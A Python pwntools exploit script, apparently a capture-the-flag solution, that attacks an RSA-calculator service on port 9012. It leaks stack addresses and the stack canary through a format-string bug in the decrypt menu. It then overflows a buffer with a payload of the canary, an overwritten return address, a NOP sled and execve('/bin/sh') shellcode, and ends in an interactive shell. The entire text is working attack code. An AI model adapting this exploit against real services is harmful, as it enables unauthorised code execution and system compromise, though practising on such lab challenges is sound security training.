#!/usr/bin/env python

from pwn import *

def wait(what, send):
    recv = p.recvuntil(what)
    p.sendline(send)

def decrypt(send):
    wait('> ', '3')
    wait('1024) : ', '-1')
    wait('data\n', '000000'.join(map(lambda c: '%02x' % ord(c), send)) + '000000')
    p.recvuntil('result -\n')
    return p.recvline()[:-1]

def reverse(payload):
    return ''.join(map(lambda c: '%02x' % ord(c), payload))

p = remote('localhost', 9012)

# set keys
wait('> ', '1')
wait('p : ', '13')
wait('q : ', '23')
wait('e : ', '265')
wait('d : ', '1')

# rdi / rsi rdx rcx r8 r9
encrypted_addr = int(decrypt('%34$p'), 16) - 0xb0
log.success('Encrypted Buffer: %x' % encrypted_addr)

canary = int(decrypt('%205$p'), 16)
log.success('Canary: %x' % canary)

ebp = int(decrypt('%206$p'), 16)
log.success('EBP: %x' % ebp)

aaa = int(decrypt('%208$p'), 16)
log.success('aaa: %x' % aaa)

sc = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload = 'a'*8 + p64(canary) + p64(ebp) + p64(encrypted_addr + 200)
payload = reverse(reverse(payload)) + '\x90' * 128
payload += sc + '\x90' * (1088 - len(payload) - len(sc))

wait('> ', '3')
wait('1024) : ', '-1')
wait('data\n', payload)
p.interactive()
